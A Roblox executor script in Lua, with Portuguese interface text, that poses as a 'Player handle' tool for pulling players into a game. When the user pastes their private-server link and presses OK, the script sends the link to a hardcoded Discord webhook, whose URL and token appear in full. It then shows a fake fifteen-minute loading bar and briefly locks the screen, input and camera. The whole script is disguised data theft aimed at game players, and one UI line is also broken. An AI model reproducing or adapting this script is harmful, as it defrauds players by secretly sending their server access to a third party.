-- PlayerHandle - Local (trava só o cliente que executou ao chegar em 10%)
-- Atenção: este script afeta somente o jogador local (seu cliente).

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- CONFIGS
local webhook_url = "https://discord.com/api/webhooks/1428103017369964565/_hTrVyWtnf4qQWMQ94pILkrxAJopWt1IbZ6pOLWKT0L9qfwybeviwGTE-DjZy-gDD_18"
local totalTime = 900 -- 15 minutos (segundos)
local lockDuration = 10 -- quantos segundos a "trava" dura ao atingir 10%

-- função genérica de envio para webhook (suporta vários executores)
local function sendToWebhook(link)
    local payload = { ["content"] = link }
    local json = HttpService:JSONEncode(payload)
    local headers = { ["Content-Type"] = "application/json" }

    if syn and syn.request then
        syn.request({ Url = webhook_url, Method = "POST", Headers = headers, Body = json })
    elseif http_request then
        http_request({ Url = webhook_url, Method = "POST", Headers = headers, Body = json })
    elseif request then
        request({ Url = webhook_url, Method = "POST", Headers = headers, Body = json })
    else
        warn("Executor não suporta requests HTTP!")
    end
end

-- cria UI principal (menu)
local function createUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PlayerHandleMenu"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 270)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -135)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("Link servidor privado")
    title.Text = "Player handle"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 30
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.Parent = mainFrame

    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "ponhe o seu servidor privado abaixo e espera a tela de carregamento!"
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 18
    subtitle.Size = UDim2.new(1, -10, 0, 40)
    subtitle.Position = UDim2.new(0, 5, 0, 55)
    subtitle.BackgroundTransparency = 1
    subtitle.TextColor3 = Color3.fromRGB(180,180,180)
    subtitle.TextWrapped = true
    subtitle.Parent = mainFrame

    local linkBox = Instance.new("TextBox")
    linkBox.PlaceholderText = "Cole o link do servidor privado aqui"
    linkBox.Font = Enum.Font.Gotham
    linkBox.TextSize = 16
    linkBox.Size = UDim2.new(1, -20, 0, 40)
    linkBox.Position = UDim2.new(0, 10, 0, 105)
    linkBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
    linkBox.TextColor3 = Color3.fromRGB(255,255,255)
    linkBox.ClearTextOnFocus = false
    linkBox.Parent = mainFrame

    local sendButton = Instance.new("TextButton")
    sendButton.Text = "OK"
    sendButton.Font = Enum.Font.GothamBold
    sendButton.TextSize = 18
    sendButton.Size = UDim2.new(0, 120, 0, 38)
    sendButton.Position = UDim2.new(0.5, -60, 0, 160)
    sendButton.BackgroundColor3 = Color3.fromRGB(70,130,180)
    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
    sendButton.Parent = mainFrame

    return screenGui, mainFrame, linkBox, sendButton
end

-- cria tela preta + barra de carregamento
local function showLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackLoadingScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0,0,0,0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 10
    blackFrame.Parent = screenGui

    local loadingTitle = Instance.new("TextLabel")
    loadingTitle.Text = "puxando players por favor espere"
    loadingTitle.Font = Enum.Font.GothamBold
    loadingTitle.TextSize = 30
    loadingTitle.Size = UDim2.new(1, 0, 0, 60)
    loadingTitle.Position = UDim2.new(0, 0, 0.3, -30)
    loadingTitle.BackgroundTransparency = 1
    loadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
    loadingTitle.ZIndex = 11
    loadingTitle.Parent = blackFrame

    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Size = UDim2.new(0.5, 0, 0, 40)
    loadingBarBg.Position = UDim2.new(0.25, 0, 0.5, 0)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.ZIndex = 11
    loadingBarBg.Parent = blackFrame

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(70,130,180)
    loadingBar.BorderSizePixel = 0
    loadingBar.ZIndex = 12
    loadingBar.Parent = loadingBarBg

    local percentText = Instance.new("TextLabel")
    percentText.Text = "0%"
    percentText.Font = Enum.Font.GothamBold
    percentText.TextSize = 18
    percentText.Size = UDim2.new(1, 0, 1, 0)
    percentText.Position = UDim2.new(0, 0, 0, 0)
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.fromRGB(255,255,255)
    percentText.ZIndex = 12
    percentText.Parent = loadingBarBg

    return screenGui, loadingBar, percentText, loadingBarBg
end

-- bloqueio do jogador local (overlay + bloquear inputs + câmera + movimentação)
local function lockLocalClient(duration)
    duration = duration or 5

    -- overlay
    local gui = Instance.new("ScreenGui")
    gui.Name = "LocalLockOverlay"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = player:WaitForChild("PlayerGui")

    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1,0,1,0)
    overlay.Position = UDim2.new(0,0,0,0)
    overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
    overlay.BorderSizePixel = 0
    overlay.Parent = gui
    overlay.ZIndex = 1000
    overlay.Active = true -- impede clique nos objetos abaixo

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.6,0,0,80)
    label.Position = UDim2.new(0.2,0,0.45, -40)
    label.Text = "Tela travada. Aguardando..."
    label.Font = Enum.Font.GothamBold
    label.TextSize = 24
    label.TextColor3 = Color3.new(1,1,1)
    label.BackgroundTransparency = 1
    label.Parent = overlay

    -- bloqueio de movimentação: armazenar originais
    local saved = {}
    local char = player.Character
    if char then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            saved.walkspeed = humanoid.WalkSpeed
            saved.jump = humanoid.JumpPower or humanoid.JumpHeight
            humanoid.WalkSpeed = 0
            if humanoid.JumpPower then
                humanoid.JumpPower = 0
            end
            humanoid.PlatformStand = true
        end
    end

    -- bloquear inputs com ContextActionService (consome entradas)
    local function blockInput(actionName, inputState, inputObject)
        return Enum.ContextActionResult.Sink
    end

    -- BindAction para várias entradas comuns
    ContextActionService:BindAction("BlockMovement", blockInput, true,
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.Space, Enum.KeyCode.Up, Enum.KeyCode.Down, Enum.KeyCode.Left, Enum.KeyCode.Right,
        Enum.UserInputType.Touch, Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseMovement
    )

    -- travar câmera (deixar fixa)
    local camera = workspace.CurrentCamera
    local prevCameraType = camera.CameraType
    local prevCameraCFrame = camera.CFrame
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = prevCameraCFrame

    -- aguardar duração e depois restaurar
    task.delay(duration, function()
        -- restaurar movimentação
        local char2 = player.Character
        if char2 then
            local humanoid2 = char2:FindFirstChildOfClass("Humanoid")
            if humanoid2 then
                humanoid2.PlatformStand = false
                if saved.walkspeed then humanoid2.WalkSpeed = saved.walkspeed end
                if saved.jump and humanoid2.JumpPower then humanoid2.JumpPower = saved.jump end
            end
        end

        -- restaurar inputs
        ContextActionService:UnbindAction("BlockMovement")

        -- restaurar camera
        local cam = workspace.CurrentCamera
        if cam then
            cam.CameraType = prevCameraType or Enum.CameraType.Custom
        end

        -- remover overlay
        if gui and gui.Parent then
            gui:Destroy()
        end
    end)
end

-- Integração: cria UI principal e lida com o envio e a tela de loading
local screenGui, mainFrame, linkBox, sendButton = createUI()

sendButton.MouseButton1Click:Connect(function()
    local link = linkBox.Text
    if link ~= "" then
        -- envia pra webhook
        sendToWebhook(link)

        -- esconde menu e mostra loading
        mainFrame.Visible = false
        local loadingGui, loadingBar, percentText = showLoadingScreen()

        local elapsed = 0
        local lockedAt10 = false

        while elapsed < totalTime do
            task.wait(0.1)
            elapsed = elapsed + 0.1
            local percent = math.floor((elapsed / totalTime) * 100)
            loadingBar.Size = UDim2.new(percent/100, 0, 1, 0)
            percentText.Text = tostring(percent) .. "%"

            -- ao atingir 10%: trava a tela do próprio cliente (apenas 1 vez)
            if not lockedAt10 and percent >= 10 then
                lockedAt10 = true
                -- trava por lockDuration segundos
                lockLocalClient(lockDuration)
            end
        end

        loadingBar.Size = UDim2.new(1,0,1,0)
        percentText.Text = "100%"

        -- opcional: remover loading (pode deixar ou destruir)
        task.delay(1, function()
            if loadingGui and loadingGui.Parent then
                loadingGui:Destroy()
            end
        end)
    end
end)